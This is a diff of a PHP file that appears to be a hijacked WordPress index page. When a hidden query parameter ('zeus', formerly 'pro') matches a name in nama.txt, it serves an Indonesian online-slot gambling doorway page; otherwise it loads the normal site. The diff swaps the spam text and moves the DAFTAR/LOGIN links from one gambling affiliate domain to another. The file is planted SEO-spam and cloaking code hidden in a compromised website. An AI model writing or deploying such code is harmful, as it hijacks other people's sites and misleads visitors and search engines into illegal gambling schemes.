@@ -2,13 +2,13 @@
 
 function feedback404()
 {
-    header("HTTP/1.0 404 Not Found");define( 'WP_USE_THEMES', true );
+    define( 'WP_USE_THEMES', true );
     require __DIR__ . '/wp-blog-header.php';
 }
-if (isset($_GET['pro'])) {
+if (isset($_GET['zeus'])) {
     $filename = "nama.txt";
     $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $target_string = strtolower($_GET['pro']);
+    $target_string = strtolower($_GET['zeus']);
     foreach ($lines as $item) {
         if (strtolower($item) === $target_string) {
             $BRAND = strtoupper($target_string);
@@ -42,12 +42,12 @@ if (isset($_GET['pro'])) {
 <!DOCTYPE html>
 <html ⚡ lang="id" itemscope="itemscope" itemtype="https://schema.org/WebPage">
 <head>
-    <title><?= $BRANDS?> 💋💋 CAWAN78 Slot Gacor Hari Ini</title>
+    <title><?= $BRANDS?> | LINK SLOT ONLINE 2024 ❤❤</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta charset="UTF-8">
-    <meta property="og:title" content="<?= $BRANDS?> 💋💋 CAWAN78 Slot Gacor Hari Ini" />
+    <meta property="og:title" content="<?= $BRANDS?> | LINK SLOT ONLINE 2024 ❤❤" />
     <meta name="description"
-        content="<?= $BRANDS;?> Tempatnya para penjudi online, karena web kami itu mengadakan bonus besar-besaran hingga 100jt perminggu, tunggu apalagi daftar sekarang!!" />
+        content="<?= $BRANDS;?> LINK SLOT ONLINE NO RUNGKAD 2024!! 👿👿" />
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name='robots' content='index, follow' />
@@ -74,11 +74,11 @@ if (isset($_GET['pro'])) {
     <meta name="supported-amp-formats" content="websites,stories,ads,email">
     <meta property="og:site_name" content="<?= $BRANDS?>" />
     <meta property="og:description"
-        content="<?= $BRANDS;?> Tempatnya para penjudi online, karena web kami itu mengadakan bonus besar-besaran hingga 100jt perminggu, tunggu apalagi daftar sekarang!!" />
+        content="<?= $BRANDS;?> LINK SLOT ONLINE NO RUNGKAD 2024!! 👿👿" />
     <meta property="og:type" content="WebPage" />
     <meta property="og:locale" content="id_ID" />
-    <meta name="image" content="https://i.ibb.co/HVJdS2C/20240202-230732.jpg">
-    <meta name="og:image" content="https://i.ibb.co/HVJdS2C/20240202-230732.jpg">
+    <meta name="image" content="https://i.ibb.co/h2jVD0m/angkawin.jpg">
+    <meta name="og:image" content="https://i.ibb.co/h2jVD0m/angkawin.jpg">
     <meta property="og:locale:alternate" content="id_ID" />
     <meta name="theme-color" content="var(--bgColor)">
     <link rel="canonical" href="#" />
@@ -162,10 +162,10 @@ if (isset($_GET['pro'])) {
             --white: #eaeaea;
             --accentColor: #E6E6E6;
             --pink: #a200ff;
-            --cyan: #031a1b;
+            --cyan: #51e334;
             --pink-hover: #0b0b0c;
-            --cyan-hover: #00e1ff;
-            --rose: #00ff0d;
+            --cyan-hover: #083103;
+            --rose: #ff0000;
             --font: 'Karla', sans-serif;
             --firstName: 'John';
             --lastName: 'Doe';
@@ -455,7 +455,7 @@ if (isset($_GET['pro'])) {
         .link1 {
             display: block;
             background-color: transparent;
-            color: var(--white);
+            color: whitesmoke;
             font-family: var(--font);
             font-weight: 700;
             text-align: center;
@@ -470,13 +470,13 @@ if (isset($_GET['pro'])) {
 
         .link1:hover {
             background-color: var(--pink-hover);
-            color: var(--white);
+            color: whitesmoke;
         }
 
         .link2 {
             display: block;
             background-color: var(--cyan);
-            color: var(--white);
+            color: black;
             font-family: var(--font);
             font-weight: 700;
             text-align: center;
@@ -491,7 +491,7 @@ if (isset($_GET['pro'])) {
 
         .link2:hover {
             background-color: var(--cyan-hover);
-            color: var(--white);
+            color: black;
         }
 
         .rose {
@@ -554,25 +554,25 @@ if (isset($_GET['pro'])) {
             text-align: center;
             margin: 0 auto 2rem;
         }
-    </style>`
+    </style>
 </head>
 
 <body>
     <header>
-        <amp-img id="image" class="animated tada infinite slower" src="https://i.ibb.co/HVJdS2C/20240202-230732.jpg"
+        <amp-img id="image" class="animated tada infinite slower" src="https://i.ibb.co/h2jVD0m/angkawin.jpg"
         alt="<?= $BRANDS?>" width="200" height="100" layout="responsive"></amp-img>
     </header>
     <div class="created by pinjam">
-        <h1 class="title animated heartBeat slow infinite">⚡ <?= $BRANDS?> ⚡</h1>
+        <h1 class="title animated heartBeat slow infinite">💋 <?= $BRANDS?> 💋</h1>
         <div class="pinjam abang">
-            <p class="font-normal"><a href="<?= $urlPath;?>"><?= $BRANDS?></a>Slot paling populer sampai saat ini ayo main di <?= $BRANDS;?></p>
+            <p class="font-normal"><a href="<?= $urlPath;?>"><?= $BRANDS?></a>Slot Online No rungkad Baby, Daftar dan menangkan jutaan hadiah dari game slot kami, dan tentunya bonus di setiap member baru sebesar 100IDR.</p>
         </div>
     </div>
     <div id="links">
-        <a class="link1 animated fadeInLeft slow" href="https://www.angkawin25.site/register?ref=anjelo" target="_blank" rel="nofollow">DAFTAR <?= $BRANDS?></a>
-        <a class="link2 animated fadeInRight slow" href="https://www.angkawin25.site/register?ref=anjelo" target="_blank" rel="nofollow">LOGIN <?= $BRANDS?></a>
-        <a class="link1 animated fadeInLeft slow" href="https://www.angkawin25.site/register?ref=anjelo" target="_blank" rel="nofollow">REKOMENDASI Slot Gacor</a>
-        <a class="link2 animated fadeInRight slow" href="https://www.angkawin25.site/register?ref=anjelo" target="_blank" rel="nofollow">LINK <?= $BRANDS?></a>
+        <a class="link1 animated fadeInLeft slow" href="https://cawan78-3.store" target="_blank" rel="nofollow">DAFTAR <?= $BRANDS?></a>
+        <a class="link2 animated fadeInRight slow" href="https://cawan78-3.store" target="_blank" rel="nofollow">LOGIN <?= $BRANDS?></a>
+        <a class="link1 animated fadeInLeft slow" href="https://cawan78-3.store" target="_blank" rel="nofollow">Game Mahjong</a>
+        <a class="link2 animated fadeInRight slow" href="https://cawan78-3.store" target="_blank" rel="nofollow">LINK <?= $BRANDS?></a>
     </div>
 
     <footer class="animated fadeIn slow delay-1s">
